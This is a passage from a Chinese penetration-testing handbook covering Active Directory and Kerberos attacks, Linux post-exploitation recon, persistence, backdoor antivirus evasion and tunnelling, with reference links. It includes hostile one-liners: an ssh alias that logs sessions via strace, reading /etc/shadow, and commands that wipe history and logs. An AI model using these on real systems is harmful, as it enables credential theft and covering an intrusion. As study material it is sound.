提供组织框架的对象。</span></p><p><span>从实现上区分，ADDS 可以分为 Domain controller、Data store、Global catalog server、RODC (Read-only domain controller) 、Site、Subnet。</span></p><p><span>每个域控制器都有完整的 ADDS 数据，每个域控都可以处理数据的修改并同步至其他的域控。域控会有一份数据拷贝（Data store），默认存储在 C:</span><span>\</span><span>Windows</span><span>\</span><span>NTDS 目录下。</span></p><p><span>Global catalog server 是存储全局 catalog 的域控，catlog 以只读的方式存储了一个 multiple-domain forest</span></p><p><span>的所有对象，用于加速搜索。</span></p></blockquote><h4 id='名称空间'><span>名称空间</span></h4><blockquote><p><span>名称空间（namespace）是一块界定好的区域，在区域内可以用名称找到与之相关的信息。</span></p></blockquote><h4 id='对象与属性'><span>对象与属性</span></h4><blockquote><p><span>ADDS 内的资源都是以对象（Object）的形式存在的，对象通过属性（Attrbute）来描述其特征。</span></p></blockquote><h4 id='组策略简介'><span>组策略简介</span></h4><blockquote><p><span>组策略 (Group Policy, GP) 用于管理网络环境中的用户和设备，定义了系统管理员管理工作所要的各种模板组件。</span></p><p><span>组策略有以下功能：</span></p></blockquote><ul><li><span>管理注册表</span></li><li><span>设置脚本</span></li><li><span>重定向文件夹</span></li><li><span>管理应用程序</span></li><li><span>指定安全选项</span></li></ul><h4 id='常用概念-1'><span>常用概念</span></h4><blockquote><p><span>组策略容器 (Group Policy Container，GPC) 存储在活动目录中，包含 GPO 属性、配置信息和版本等。可以通过 GPC 来查找 GPT。</span></p><p><span>组策略模板 (Group Policy Template, GPT) 存储在域控中，包含所有的组策略信息。包括管理模板，安全，脚本，软件安装等。</span></p><p><span>其中 GPC 中的信息量少、容量小，GPT 中消息量较大、容量大，因此两个部分分开存放。防止活动目录中因存储了过多的数据而被影响性能。</span></p><p><span>组策略对象 (Group Policy Object, GPO) 是包含多种 Windows 组策略设置的集合，存储在 GPC 和 GPT</span></p><p><span>中。</span></p></blockquote><h4 id='kerberos-的-windows-实现相关定义'><span>Kerberos 的 Windows 实现相关定义</span></h4><blockquote><p><strong><span>SPN</span></strong></p><p><span>服务主体名称 (ServicePrincipal Names, SPN) ，是服务实例 (如 HTTP、SMB 等) 的唯一标识符。</span></p><p><span>SPN 分为两种类型：一种是注册在活动目录的机器帐户下，当一个服务的权限为 Local System 或 Network Service，则 SPN 注册在机器帐户下。一种是注册在活动目录的域用户帐户下，当一个服务的权限为一个域用户，则 SPN 注册在域用户帐户下。</span></p></blockquote><h4 id='攻击类型'><span>攻击类型</span></h4><blockquote><p><strong><span>黄金票据利用</span></strong></p><p><span>在认证过程中，经过 client 与 AS 的通信会得到 TGT，黄金票据（Golden Ticket）就是伪造票据授予票据</span></p><p><span>（TGT），也被称为认证票据。</span></p><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>黄金票据利用需要与 DC 通信， 需要获取 krbtgt 的 hash，但是可以获取任何 Kerbose 服务权限。</span></p></blockquote><h4 id='白银票据利用'><span>白银票据利用</span></h4><blockquote><p><span>白银票据（Silver Tickets）伪造利用的是 Kerberos 认证中的第三个步骤，在第三步的时候，client 会带着 ticket 向 server 的某个服务进行请求，如果验证通过就可以访问 server 上的指定服务了，这里的 ticket 是基于 client info、server session key、end time、server hash。这里 client info 已知，end time 可以构造，server session key 是 TGS 生成的，所以只要 server 的 NTLM hash 即可。银票伪造的是 TGS，只能访问指定的服务。</span></p></blockquote><h4 id='dcsync-攻击'><span>DCSync 攻击</span></h4><blockquote><p><span>DCSync 是域渗透中经常会用到的技术。DCSync 是 mimikatz 在 2015 年添加的一个功能，由 Benjamin DELPY gentilkiwi 和 Vincent LE TOUX 共同编写，基于 </span><a href='https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47'><span>DRS</span></a><span> 来导出域内所有用户的 hash。</span></p><p><span>这种方式需要满足以下任一一种权限：</span></p></blockquote><ul><li><span>Administrators 组内的用户</span></li><li><span>Domain Admins 组内的用户</span></li><li><span>Enterprise Admins 组内的用户</span></li><li><span>域控制器的计算机帐户</span></li></ul><h4 id='dcshadow-攻击'><span>DCShadow 攻击</span></h4><blockquote><p><span>DCShadow 是由来自法国的安全研究人员 Benjamin Delpy 和 Vincent Le Toux 在 2018 年的微软蓝帽（Blue Hat）大会上提出。</span></p><p><span>DCShadow 攻击指在 Active Directory 环境下创建一个恶意的域控制器，并用它来推送恶意对象。</span></p></blockquote><h4 id='哈希传递攻击'><span>哈希传递攻击</span></h4><blockquote><p><span>哈希传递攻击（Pass-the-Hash，PTH）是通过传递 NTLM 哈希来认证的攻击方法，常用的工具有 mimikatz</span></p><p><span>等。</span></p></blockquote><h4 id='票据传递攻击'><span>票据传递攻击</span></h4><blockquote><p><span>票据传递攻击（Pass-the-Ticket Attacks，PtT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。PtT 最常见的用途可能是使用黄金票据和白银票据，通过 PtT 访问主机相当简单。</span></p></blockquote><h4 id='kerberoasting-attacks'><span>Kerberoasting Attacks</span></h4><blockquote><p><span>Kerberoasting 攻击由 Tim Medin 在 2014 DerbyCon conference 上 </span><a href='https://www.youtube.com/watch?v=PUyhlN-E5MU'><span>公开</span></a><span> 。指域内的任何一台主机，都可以通过查询 SPN，Kerberoasting 即是向域内的所有服务请求 TGS，然后进行暴力破解。</span></p></blockquote><h4 id='roasting-as-rep'><span>Roasting AS-REP</span></h4><blockquote><p><span>该攻击枚举域中不需要 Kerberos 预身份认证的帐户，向这些账户请求一条加密信息，并离线尝试获取到的账户哈希。该方式需要账户明确设置了 DONT_REQ_PREAUTH 。</span></p></blockquote><h4 id='kerberos-delegation-attacks'><span>Kerberos Delegation Attacks</span></h4><blockquote><p><span>在一个域中，A 使用 Kerberos 身份验证访问服务 B，B 再使用 A 的身份去访问 C，这个过程就可以理解为委派。委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两种，非约束委派可以访问域内任意其它服务，约束委派对认证做了限制不可以访问其他的服务。</span></p><p><span>Kerberos Delegation（Kerberos 委派）攻击分为非约束委派攻击和约束委派攻击。原理都是基于域内已经配置了委派的账户来获取其它账户的权限。</span></p></blockquote><h4 id='其他漏洞利用'><span>其他漏洞利用</span></h4><ul><li><p><span>ProxyLogon (CVE-2021-26855)</span></p></li><li><p><span>ProxyShell (CVE-2021-34473)</span></p></li><li><p><span>SMBGhost (CVE-2020-0796)</span></p></li><li><p><span>Zerologon (CVE-2020-1472)</span></p></li><li><p><span>永恒之蓝 (MS17-010)</span></p><ol start='' ><li><h2 id='linux-内网渗透'><span>Linux 内网渗透</span></h2><ol start='' ><li><h3 id='信息收集-信息收集-2'><span>信息收集 {#信息收集-2}</span></h3></li></ol></li></ol></li></ul><h4 id='获取内核操作系统和设备信息'><span>获取内核，操作系统和设备信息</span></h4><ul><li><p><img src="media/image3.png" referrerpolicy="no-referrer"><strong><span>版 信息</span></strong></p><ul><li><span>uname -a 所有版本</span></li><li><span>uname -r 内核版本信息</span></li><li><span>uname -n 系统主机名字</span></li><li><span>uname -m Linux 内核架构</span></li></ul></li><li><p><span>内核信息 cat /proc/version</span></p></li><li><p><span>CPU 信息 cat /proc/cpuinfo</span></p></li><li><h4 id='发布信息'><span>发布信息</span></h4><ul><li><span>cat /etc/</span><span>*</span><span>-release</span></li><li><span>cat /etc/issue</span></li></ul></li><li><p><span>主机名 hostname</span></p></li><li><p><span>文件系统 df -a</span></p></li><li><p><span>内核日志 dmesg / /var/log/dmesg</span></p></li></ul><h4 id='用户和组'><span>用户和组</span></h4><ul><li><p><span>列出系统所有用户 cat /etc/passwd</span></p></li><li><p><span>列出系统所有组 cat /etc/group</span></p></li><li><p><span>列出所有用户 hash（root）</span>’’<span>cat /etc/shadow</span>’’</p></li><li><h4 id='用户-2'><span>用户</span></h4><ul><li><span>查询用户的基本信息 finger</span></li><li><span>当前登录的用户 users who -a /var/log/utmp</span></li><li><span>查询无密码用户 grep </span><span>&#39;</span><span>x:0:</span><span>&#39;</span><span> /etc/passwd</span></li></ul></li><li><p><span>目前登录的用户 w</span></p></li><li><p><span>登入过的用户信息 last / /var/log/wtmp</span></p></li><li><p><span>显示系统中所有用户最近一次登录信息 lastlog / /var/log/lastlog</span></p></li><li><p><span>登录成功日志 /var/log/secure</span></p></li><li><p><span>登录失败日志 /var/log/faillog</span></p></li><li><p><span>查看特权用户 grep :0 /etc/passwd</span></p></li><li><p><span>查看 passwd 最后修改时间 ls -l /etc/passwd</span></p></li><li><p><span>查看是否存在空口令用户 awk -F: </span><span>&#39;</span><span>length(</span><span>$</span><span>2)==0 {print </span><span>$</span><span>1}</span><span>&#39;</span><span> /etc/shadow</span></p></li><li><p><span>查看远程登录的账号 awk </span><span>&#39;</span><span>/</span><span>\</span><span>$</span><span>1</span><span>|</span><span>\</span><span>$</span><span>6/{print </span><span>$</span><span>1}</span><span>&#39;</span><span> /etc/shadow</span></p></li><li><h4 id='查看具有-sudo-权限的用户'><span>查看具有 sudo 权限的用户</span></h4><ul><li><span>cat /etc/sudoers </span><span>|</span><span> grep -v </span><span>&quot;</span><span>\^#</span><span>\</span><span>|</span><span>\^</span><span>$</span><span>&quot;</span><span> </span><span>|</span><span> grep </span><span>&quot;</span><span>ALL=(ALL)</span><span>&quot;</span></li></ul></li></ul><h4 id='用户和权限信息'><span>用户和权限信息</span></h4><ul><li><span>当前用户 whoami</span></li><li><span>当前用户信息 id</span></li><li><span>可以使用 sudo 提升到 root 的用户（root）cat /etc/sudoers</span></li><li><span>列出目前用户可执行与无法执行的指令 sudo -l</span></li></ul><h4 id='环境信息'><span>环境信息</span></h4><ul><li><span>打印系统环境信息 env</span></li><li><span>打印系统环境信息 set</span></li><li><span>环境变量中的路径信息 echo </span><span>$</span><span>PATH</span></li><li><span>打印历史命令 history / </span><span>~</span><span>/.bash_history</span></li><li><span>显示当前路径 pwd</span></li><li><span>显示默认系统遍历 cat /etc/profile</span></li><li><span>显示可用的 shell cat /etc/shells</span></li></ul><h4 id='进程信息-2'><span>进程信息</span></h4><ul><li><span>查看进程信息 ps aux</span></li><li><span>资源占有情况 top -c</span></li><li><span>查看进程关联文件 lsof -c </span><span>$</span><span>PID</span></li><li><span>完整命令行信息 /proc/</span><span>$</span><span>PID/cmdline</span></li><li><span>进程的命令名 /proc/</span><span>$</span><span>PID/comm</span></li><li><span>进程当前工作目录的符号链接 /proc/</span><span>$</span><span>PID/cwd</span></li><li><span>运行程序的符号链接 /proc/</span><span>$</span><span>PID/exe</span></li><li><span>进程的环境变量 /proc/</span><span>$</span><span>PID/environ</span></li><li><span>进程打开文件的情况 /proc/</span><span>$</span><span>PID/fd</span></li></ul><h4 id='服务信息'><span>服务信息</span></h4><ul><li><span>由 inetd 管理的服务列表 cat /etc/inetd.conf</span></li><li><span>由 xinetd 管理的服务列表 cat /etc/xinetd.conf</span></li><li><span>nfs 服务器的配置 cat /etc/exports</span></li><li><span>邮件信息 /var/log/mailog</span></li><li><span>ssh 配置 sshd_config</span></li></ul><h4 id='计划任务-2'><span>计划任务</span></h4><ul><li><p><span>显示指定用户的计划作业（root）crontab -l -u %user%</span></p></li><li><h4 id='计划任务-3'><span>计划任务</span></h4><ul><li><span>/var/spool/cron/</span><span>*</span></li><li><span>/var/spool/anacron/</span><span>*</span></li><li><span>/etc/crontab</span></li><li><span>/etc/anacrontab</span></li><li><span>/etc/cron.</span><span>*</span></li><li><span>/etc/anacrontab</span></li></ul></li><li><h4 id='开机启动项'><span>开机启动项</span></h4><ul><li><span>/etc/rc.d/init.d/</span></li></ul></li></ul><h4 id='网络路由和通信'><span>网络、路由和通信</span></h4><ul><li><span>列出网络接口信息 /sbin/ifconfig -a / ip addr show</span></li><li><span>列出网络接口信息 cat /etc/network/interfaces</span></li><li><span>查看系统 arp 表 arp -a</span></li><li><span>打印路由信息 route / ip ro show</span></li><li><span>查看 dns 配置信息 cat /etc/resolv.conf</span></li><li><span>打印本地端口开放信息 netstat -an</span></li><li><span>列出 iptable 的配置规则 iptables -L</span></li><li><span>查看端口服务映射 cat /etc/services</span></li><li><span>Hostname hostname -f</span></li><li><span>查看进程端口情况 netstat -anltp </span><span>|</span><span> grep </span><span>$</span><span>PID</span></li></ul><h4 id='已安装程序'><span>已安装程序</span></h4><ul><li><span>rpm -qa </span><span>-</span><span>-last Redhat</span></li><li><span>yum list </span><span>|</span><span> grep installed CentOS</span></li><li><span>ls -l /etc/yum.repos.d/</span></li><li><span>dpkg -l Debian</span></li><li><span>cat /etc/apt/sources.list Debian APT</span></li><li><span>pkg_info xBSD</span></li><li><span>pkginfo Solaris</span></li><li><span>pacman -Q Arch Linux</span></li><li><span>emerge Gentoo</span></li></ul><h4 id='文件-2'><span>文件</span></h4><ul><li><span>最近五天的文件 find / -ctime +1 -ctime -5</span></li><li><span>文件系统细节 debugfs</span></li></ul><h4 id='公私钥信息'><span>公私钥信息</span></h4><ul><li><span>~</span><span>/.ssh</span></li><li><span>/etc/ssh</span></li></ul><h4 id='日志-2'><span>日志</span></h4><ul><li><span>/var/log/boot.log</span></li><li><span>/var/log/cron</span></li><li><span>/var/log/faillog</span></li><li><span>/var/log/lastlog</span></li><li><span>/var/log/messages</span></li><li><span>/var/log/secure</span></li><li><span>/var/log/syslog</span></li><li><span>/var/log/syslog</span></li><li><span>/var/log/wtmp</span></li><li><span>/var/log/wtmp</span></li><li><span>/var/run/utmp</span></li></ul><h4 id='虚拟环境检测'><span>虚拟环境检测</span></h4><ul><li><span>lsmod </span><span>|</span><span> grep -i </span><span>&quot;</span><span>vboxsf</span><span>\</span><span>|</span><span>vboxguest</span><span>&quot;</span></li><li><span>lsmod </span><span>|</span><span> grep -i </span><span>&quot;</span><span>vmw_baloon</span><span>\</span><span>|</span><span>vmxnet</span><span>&quot;</span></li><li><span>lsmod </span><span>|</span><span> grep -i </span><span>&quot;</span><span>xen-vbd</span><span>\</span><span>|</span><span>xen-vnif</span><span>&quot;</span></li><li><span>lsmod </span><span>|</span><span> grep -i </span><span>&quot;</span><span>virtio_pci</span><span>\</span><span>|</span><span>virtio_net</span><span>&quot;</span></li><li><span>lsmod </span><span>|</span><span> grep -i </span><span>&quot;</span><span>hv_vmbus</span><span>\</span><span>|</span><span>hv_blkvsc</span><span>\</span><span>|</span><span>hv_netvsc</span><span>\</span><span>|</span><span>hv_utils</span><span>\</span><span>|</span><span>hv_storvsc</span><span>&quot;</span></li></ul><h4 id='容器内信息收集'><span>容器内信息收集</span></h4><ul><li><span>capsh </span><span>-</span><span>-print</span></li><li><span>cat /proc/1/cgroup</span></li><li><span>env </span><span>|</span><span> grep KUBE</span></li><li><span>ls -l .dockerenv</span></li><li><span>ls -l /run/secrets/Kubernetes.io/</span></li><li><span>mount</span></li><li><span>ps aux</span></li></ul><h3 id='持久化-3'><span>持久化</span></h3><h4 id='权限提升-2'><span>权限提升</span></h4><ul><li><p><span>内核漏洞利用</span></p></li><li><p><span>攻击有 root 权限的服务</span></p></li><li><p><span>利用第三方服务提权</span></p></li><li><h4 id='通过有-suid-属性的可执行文件'><span>通过有 SUID 属性的可执行文件</span></h4><ul><li><span>查找可能提权的可执行文件</span></li><li><span>find / -perm +4000 -ls</span></li><li><span>find / -perm -u=s -type f 2</span><span>&gt;</span><span>/dev/null</span></li><li><span>find / -user root -perm -4000 -print 2</span><span>&gt;</span><span>/dev/null</span></li><li><span>find / -user root -perm -4000 -exec ls -ldb {} </span><span>\</span><span>; 2</span><span>&gt;</span><span>/dev/null</span></li></ul></li><li><h4 id='利用可用的-root-权限'><span>利用可用的 root 权限</span></h4><ul><li><span>sudo -l</span></li></ul></li><li><p><span>利用误配置的 crontab 任务</span></p></li></ul><h4 id='自启动-2'><span>自启动</span></h4><ul><li><span>/etc/init.d</span></li><li><span>/etc/rc.d/rc.local</span></li><li><span>~</span><span>/.bashrc</span></li><li><span>~</span><span>/.zshrc</span></li></ul><h4 id='后门-3'><span>后门</span></h4><ul><li><p><strong><span>ssh 后门</span></strong></p><ul><li><span>alias ssh=</span><span>&#39;</span><span>strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh</span><span>&#39;</span></li><li><span>后门账户</span></li></ul></li><li><h4 id='常见应用'><span>常见应用</span></h4><ul><li><span>ICMP</span></li><li><span>DNS</span></li></ul></li><li><p><span>icmp 后门</span></p></li><li><p><span>后门端口复用</span></p></li><li><p><span>. 开头隐藏文件</span></p></li><li><p><span>rootkit</span></p></li></ul><h3 id='痕迹清理-2'><span>痕迹清理</span></h3><h4 id='历史命令'><span>历史命令</span></h4><ul><li><span>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;</span></li><li><span>kill -9 </span><span>$</span><span>$</span><span> kill history</span></li><li><span>history -c</span></li><li><span>在 HISTSIZE=0 中设置 HISTSIZE=0</span></li></ul><h4 id='清除修改日志文件'><span>清除/修改日志文件</span></h4><ul><li><span>/var/log/btmp</span></li><li><span>/var/log/lastlog</span></li><li><span>/var/log/wtmp</span></li><li><span>/var/log/utmp</span></li><li><span>/var/log/secure</span></li><li><span>/var/log/message</span></li></ul><h4 id='登录痕迹'><span>登录痕迹</span></h4><ul><li><p><span>删除 </span><span>~</span><span>/.ssh/known_hosts 中记录</span></p></li><li><h4 id='修改文件时间戳'><span>修改文件时间戳</span></h4><ul><li><span>touch </span>–<span>r</span></li></ul></li><li><p><span>删除 tmp 目录临时文件</span></p></li></ul><h4 id='操作痕迹'><span>操作痕迹</span></h4><ul><li><p><span>vim 不记录历史命令 :set history=0</span></p></li><li><h4 id='ssh-登录痕迹'><span>ssh 登录痕迹</span></h4><ul><li><span>无痕登录 ssh -T user@host /bin/bash -i</span></li></ul></li></ul><h4 id='覆写文件'><span>覆写文件</span></h4><ul><li><span>shred</span></li><li><span>dd</span></li><li><span>wipe</span></li></ul><h4 id='难点'><span>难点</span></h4><ul><li><span>攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征</span></li><li><span>即使删除本地日志，在网络设备、安全设备、集中化日志系统中仍有记录</span></li><li><span>留存的后门包含攻击者的信息</span></li><li><span>使用的代理或跳板可能会被反向入侵</span></li></ul><h4 id='注意'><span>注意</span></h4><ul><li><span>在操作前检查是否有用户在线</span></li><li><span>删除文件使用磁盘覆写的功能删除</span></li><li><span>尽量和攻击前状态保持一致</span></li></ul><h4 id='参考链接-参考链接-32'><span>参考链接 {#参考链接-32}</span></h4><ul><li><a href='https://mp.weixin.qq.com/s/i2WvFmF1qQjbx-BaStXb1Q'><span>Linux 入侵痕迹清理技巧</span></a></li></ul><ol start='2' ><li><h2 id='后门技术'><span>后门技术</span></h2><ol start='' ><li><h3 id='开发技术'><span>开发技术</span></h3><ul><li><h4 id='管控功能实现技术'><span>管控功能实现技术</span></h4><ul><li><span>系统管理：查看系统基本信息，进程管理，服务管理</span></li><li><span>文件管理：复制/粘贴文件，删除文件/目录，下载/上传文件等</span></li><li><span>Shell 管理</span></li><li><span>击键记录监控</span></li><li><span>屏幕截取</span></li><li><span>音频监控</span></li><li><span>视频监控</span></li><li><span>隐秘信息查看</span></li><li><span>移动磁盘的动态监控</span></li><li><span>远程卸载</span></li></ul></li><li><h4 id='自启动技术'><span>自启动技术</span></h4><ul><li><p><strong><span>Windows 自启动</span></strong></p><ul><li><span>基于 Windows 启动目录的自启动</span></li><li><span>基于注册表的自启动</span></li><li><span>基于服务程序的自启动</span></li><li><span>基于 ActiveX 控件的自启动</span></li><li><span>基于计划任务（Scheduled Tasks）的自启动</span></li></ul></li><li><p><span>Linux 自启动</span></p></li></ul></li><li><h4 id='用户态进程隐藏技术'><span>用户态进程隐藏技术</span></h4><ul><li><p><strong><span>基于 DLL 插入的进程隐藏</span></strong></p><ul><li><span>远程线程创建技术</span></li><li><span>设置窗口挂钩（HOOK）技术</span></li></ul></li><li><p><span>基于 SvcHost 共享服务的进程隐藏</span></p></li><li><p><span>进程内存替换</span></p></li></ul></li><li><h4 id='数据穿透和躲避技术'><span>数据穿透和躲避技术</span></h4><ul><li><p><span>反弹端口</span></p></li><li><h4 id='协议隧道'><span>协议隧道</span></h4><ul><li><span>HTTP</span></li><li><span>MSN</span></li><li><span>Google Talk</span></li></ul></li></ul></li><li><p><span>内核级隐藏技术（Rootkit）</span></p></li><li><h4 id='磁盘启动级隐藏技术bootkit）'><span>磁盘启动级隐藏技术（Bootkit）</span></h4><ul><li><span>MBR</span></li><li><span>BIOS</span></li><li><span>NTLDR</span></li><li><span>boot.ini</span></li></ul></li><li><p><span>还原软件对抗技术</span></p></li></ul></li><li><h3 id='后门免杀'><span>后门免杀</span></h3><ul><li><h4 id='传统静态代码检测'><span>传统静态代码检测</span></h4><ul><li><span>加壳</span></li><li><span>添加花指令</span></li><li><span>输入表免杀</span></li></ul></li><li><h4 id='启发式代码检测'><span>启发式代码检测</span></h4><ul><li><span>动态函数调用</span></li></ul></li><li><h4 id='云查杀'><span>云查杀</span></h4><ul><li><span>动态增大自身体积</span></li><li><span>更改云查杀服务器域名解析地址</span></li><li><span>断网</span></li><li><span>利用散列碰撞绕过云端</span>“<span>白名单</span>”</li></ul></li><li><h4 id='攻击主防杀毒软件'><span>攻击主防杀毒软件</span></h4><ul><li><span>更改系统时间</span></li><li><span>窗口消息攻击</span></li><li><span>主动发送 IRP 操纵主防驱动</span></li></ul></li><li><h4 id='利用证书信任'><span>利用证书信任</span></h4><ul><li><span>盗取利用合法证书</span></li><li><span>利用散列碰撞伪造证书</span></li><li><span>利用合法程序 DLL 劫持问题的</span>“<span>白加黑</span>”</li></ul></li></ul></li><li><h3 id='检测技术'><span>检测技术</span></h3><ul><li><span>基于自启动信息的检测</span></li><li><span>基于进程信息的检测</span></li><li><span>基于数据传输的检测</span></li><li><span>Rootkit/Bootkit 的检测</span></li></ul></li><li><h3 id='后门分析'><span>后门分析</span></h3><ul><li><p><span>动态分析</span></p></li><li><h4 id='静态分析-1'><span>静态分析</span></h4><ul><li><span>反病毒引擎扫描</span></li><li><span>文件格式识别</span></li><li><span>文件加壳识别及脱壳</span></li><li><span>明文字符串查找</span></li><li><span>链接库及导入/导出函数分析</span></li></ul></li></ul></li></ol></li><li><h2 id='综合技巧'><span>综合技巧</span></h2><ol start='' ><li><h3 id='端口转发'><span>端口转发</span></h3><ul><li><h4 id='windows-1'><span>windows</span></h4><ul><li><span>lcx</span></li><li><span>netsh</span></li></ul></li><li><h4 id='linux-1'><span>linux</span></h4><ul><li><span>portmap</span></li><li><span>iptables</span></li></ul></li><li><h4 id='socket-代理'><span>socket 代理</span></h4><ul><li><span>Win: xsocks</span></li><li><span>Linux: proxychains</span></li></ul></li><li><h4 id='mediaimage4pngwidth013194444444444445in-height013194444444444445in基于-http-的转发与-socket-代理-低权限下的-透'><img src="media/image4.png" referrerpolicy="no-referrer"><span>基于 http 的转发与 socket 代理 (低权限下的 透)</span></h4><ul><li><span>端口转发: tunna</span></li><li><span>socks 代理: reGeorg</span></li></ul></li><li><h4 id='ssh-通道'><span>ssh 通道</span></h4><ul><li><span>端口转发</span></li><li><span>socks</span></li></ul></li></ul></li><li><h3 id='获取-shell'><span>获取 shell</span></h3><ul><li><span>常规 shell 反弹</span></li><li><span>突破防火墙的 imcp_shell 反弹</span></li><li><span>正向 shell</span></li></ul></li><li><h3 id='内网文件传输'><span>内网文件传输</span></h3><ul><li><h4 id='windows-下文件传输'><span>windows 下文件传输</span></h4><ul><li><span>powershell</span></li><li><span>vbs 脚本文件</span></li><li><span>bitsadmin</span></li><li><span>文件共享</span></li><li><span>使用 telnet 接收数据</span></li><li><span>hta</span></li></ul></li><li><h4 id='linux-下文件传输'><span>linux 下文件传输</span></h4><ul><li><span>python</span></li><li><span>wget</span></li><li><span>tar + ssh</span></li><li><span>利用 dns 传输数据</span></li></ul></li><li><h4 id='文件编译'><span>文件编译</span></h4><ul><li><span>powershell 将 exe 转为 txt，再 txt 转为 exe</span></li></ul></li></ul></li><li><h3 id='远程连接--执行程序'><span>远程连接 &amp;&amp; 执行程序</span></h3><ul><li><span>at&amp;schtasks</span></li><li><span>psexec</span></li><li><span>wmic</span></li><li><span>wmiexec.vbs</span></li><li><span>smbexec</span></li><li><span>powershell remoting</span></li><li><span>SC 创建服务执行</span></li><li><span>schtasks</span></li><li><span>SMB+MOF </span><span>|</span><span>|</span><span> DLL Hijacks</span></li><li><span>PTH + compmgmt.msc</span></li></ul></li></ol></li></ol><blockquote><p><strong><span>6.4. 综合技巧</span></strong><span> </span><strong><span>259</span></strong></p></blockquote><ol start='4' ><li><h2 id='参考链接-参考链接-33'><span>参考链接 {#参考链接-33}</span></h2><ol start='' ><li><h3 id='windows-2'><span>Windows</span></h3><ul><li><a href='https://docs.microsoft.com/zh-cn/windows/security/threat-protection/'><span>Windows 威胁防护</span></a></li><li><a href='https://www.freebuf.com/articles/system/114731.html'><span>Windows 内网渗透提权</span></a></li><li><a href='https://gh0st.cn/archives/2017-03-29/1'><span>文件寄生 NTFS 文件流实际应用</span></a></li><li><a href='https://xz.aliyun.com/t/6461'><span>Windows 中常见后门持久化方法总结</span></a></li><li><a href='https://lolbas-project.github.io/'><span>LOLBAS</span></a></li><li><a href='https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4/'><span>渗透技巧</span>–––<span>Windows 单条日志的删除</span></a></li><li><a href='https://xz.aliyun.com/t/7155'><span>windows 取证文件执行记录的获取和清除</span></a></li><li><a href='https://www.darkoperator.com/blog/2020/1/14/getting-dns-client-cached-entries-with-cimwmi'><span>Getting DNS Client Cached Entries with CIM/WMI</span></a></li><li><a href='https://lengjibo.github.io/Persistence/'><span>Windows 单机 Persistence</span></a></li><li><a href='https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/'><span>Dumping RDP Credentials</span></a></li></ul></li></ol></li></ol><h4 id='域渗透-2'><span>域渗透</span></h4><ul><li><a href='https://nosec.org/home/detail/2510.html'><span>绕过域账户登录失败次数的限制</span></a></li><li><a href='https://mp.weixin.qq.com/s?__biz=Mzg3NzE5OTA5NQ%3D%3D&amp;mid=2247483807&amp;idx=1&amp;sn=59be50aa5cc735f055db596269a857ce'><span>域渗透总结</span></a></li><li><a href='https://medium.com/%40adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa'><span>got domain admin on internal network</span></a></li><li><span>Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft Techniques </span><span>&lt;</span><a href='http://download.microsoft.com/download/7/7/A/77ABC5BD-8320-41AF-863C-6ECFB10CB4B9/Mitigating%20Pass-the-Hash%20(PtH)%20Attacks%20and%20Other%20Credential%20Theft%20Techniques_English.pdf'><span>http:</span></a></li></ul><blockquote><p><a href='http://download.microsoft.com/download/7/7/A/77ABC5BD-8320-41AF-863C-6ECFB10CB4B9/Mitigating%20Pass-the-Hash%20(PtH)%20Attacks%20and%20Other%20Credential%20Theft%20Techniques_English.pdf'><span>//download.microsoft.com/download/7/7/A/77ABC5BD-8320-41AF-863C-6ECFB10CB4B9/</span></a><span> </span><a href='http://download.microsoft.com/download/7/7/A/77ABC5BD-8320-41AF-863C-6ECFB10CB4B9/Mitigating%20Pass-the-Hash%20(PtH)%20Attacks%20and%20Other%20Credential%20Theft%20Techniques_English.pdf'><span>Mitigating%20Pass-the-Hash%20(PtH)%20Attacks%20and%20Other%20Credential%20Theft%</span></a><span> </span><a href='http://download.microsoft.com/download/7/7/A/77ABC5BD-8320-41AF-863C-6ECFB10CB4B9/Mitigating%20Pass-the-Hash%20(PtH)%20Attacks%20and%20Other%20Credential%20Theft%20Techniques_English.pdf'><span>20Techniques_English.pdf</span></a><span>&gt;</span>’<span>_</span></p></blockquote><ul><li><a href='https://github.com/uknowsec/Active-Directory-Pentest-Notes'><span>域渗透学习笔记</span></a></li><li><a href='https://qomplx.com/qomplx-knowledge-fundamentals-of-active-directory-trust-relationships/'><span>QOMPLX Knowledge: Fundamentals of Active Directory Trust Relationships</span></a></li><li><a href='https://www.cnblogs.com/backlion/p/8127868.html'><span>Kerberos 的黄金票据详解</span></a></li><li><a href='https://blog.alsid.eu/dcshadow-explained-4510f52fc19d'><span>DCShadow explained: A technical deep dive into the latest AD attack technique</span></a></li><li><a href='https://adsecurity.org/'><span>Active Directory Security</span></a></li><li><a href='https://blog.xpnsec.com/kerberos-attacks-part-1/'><span>Kerberos AD Attacks Kerberoasting</span></a></li><li><a href='https://xz.aliyun.com/t/7517'><span>Kerberos 之域内委派攻击</span></a></li><li><a href='https://github.com/cfalta/adsec'><span>adsec</span></a><span> An introduction to Active Directory security</span></li><li><a href='https://zer1t0.gitlab.io/posts/attacking_ad/'><span>Attacking Active Directory</span></a></li></ul><ol start='2' ><li><h3 id='redteam'><span>RedTeam</span></h3><ul><li><a href='https://github.com/klionsec/RedTeamManual'><span>RedTeamManual</span></a></li></ul></li><li><h3 id='内网'><span>内网</span></h3><ul><li><a href='https://xz.aliyun.com/t/2354'><span>内网安全检查</span></a></li><li><a href='https://www.anquanke.com/post/id/92646'><span>我所知道的内网渗透</span></a></li><li><a href='https://github.com/l3m0n/pentest_study'><span>从零开始内网渗透学习</span></a></li><li><a href='https://xz.aliyun.com/t/1649/'><span>渗透技巧从 Github 下载安装文件</span></a></li><li><a href='https://offsec.provadys.com/intro-to-file-operation-abuse-on-Windows.html'><span>An introduction to privileged file operation abuse on Windows</span></a></li><li><a href='https://xz.aliyun.com/t/4522'><span>脚本维权 tips</span></a></li></ul></li><li><h3 id='cobalt-strike-1'><span>Cobalt Strike</span></h3><ul><li><a href='http://blog.leanote.com/post/snowming/Cobalt-Strike'><span>Cobalt Strike 